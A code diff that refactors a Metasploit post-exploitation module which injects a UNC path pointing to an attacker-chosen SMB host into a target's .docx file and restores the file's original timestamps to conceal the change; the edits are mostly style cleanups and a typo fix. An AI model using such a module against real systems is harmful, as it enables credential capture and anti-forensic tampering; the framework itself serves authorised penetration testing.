@@ -3,18 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-#
-# Gems
-#
-
-# for extracting files
 require 'zip'
-
-#
-# Project
-#
-
-# for creating files
 require 'rex/zip'
 
 class MetasploitModule < Msf::Post
@@ -41,6 +30,11 @@ class MetasploitModule < Msf::Post
         'Author' => [
           'SphaZ <cyberphaz[at]gmail.com>'
         ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -62,14 +56,13 @@ class MetasploitModule < Msf::Post
   end
 
   # Store MACE values so we can set them later again.
-  def get_mace
-    begin
-      mace = session.priv.fs.get_file_mace(datastore['FILE'])
-      vprint_status('Got file MACE attributes!')
-    rescue StandardError
-      print_error("Error getting the original MACE values of #{datastore['FILE']}, not a fatal error but timestamps will be different!")
-    end
-    return mace
+  def get_mace(file_name)
+    mace = session.priv.fs.get_file_mace(file_name)
+    vprint_status('Got file MACE attributes!')
+    mace
+  rescue StandardError
+    print_error("Error getting the original MACE values of #{datastore['FILE']}, not a fatal error but timestamps will be different!")
+    return nil
   end
 
   # here we unzip into memory, inject our UNC path, store it in a temp file and
@@ -136,7 +129,7 @@ class MetasploitModule < Msf::Post
           zip_data[entry.name] = filezip.read(entry)
         end
       end
-    rescue Zip::Error => e
+    rescue Zip::Error
       print_error("Error extracting #{datastore['FILE']} please verify it is a valid .docx document.")
       return nil
     end
@@ -154,14 +147,12 @@ class MetasploitModule < Msf::Post
 
   # We try put the mace values back to that of the original file
   def set_mace(mace)
-    if !mace.nil?
-      vprint_status("Setting MACE value of #{datastore['FILE']} set to that of the original file.")
-      begin
-        session.priv.fs.set_file_mace(datastore['FILE'], mace['Modified'], mace['Accessed'], mace['Created'], mace['Entry Modified'])
-      rescue StandardError
-        print_error("Error setting the original MACE values of #{datastore['FILE']}, not a fatal error but timestamps will be different!")
-      end
-    end
+    return if mace.nil?
+
+    vprint_status("Setting MACE value of #{datastore['FILE']} set to that of the original file.")
+    session.priv.fs.set_file_mace(datastore['FILE'], mace['Modified'], mace['Accessed'], mace['Created'], mace['Entry Modified'])
+  rescue StandardError
+    print_error("Error setting the original MACE values of #{datastore['FILE']}, not a fatal error but timestamps will be different!")
   end
 
   def rhost
@@ -177,7 +168,7 @@ class MetasploitModule < Msf::Post
 
     # get mace values so we can put them back after uploading. We do this first, so we have the original
     # accessed time too.
-    file_mace = get_mace
+    file_mace = get_mace(datastore['FILE'])
 
     # download the remote file
     print_status("Downloading remote file #{datastore['FILE']}.")
@@ -243,6 +234,6 @@ class MetasploitModule < Msf::Post
       end
     end
 
-    print_good("Done! Remote file #{datastore['FILE']} succesfully injected to point to #{datastore['SMBHOST']}")
+    print_good("Done! Remote file #{datastore['FILE']} successfully injected to point to #{datastore['SMBHOST']}")
   end
 end
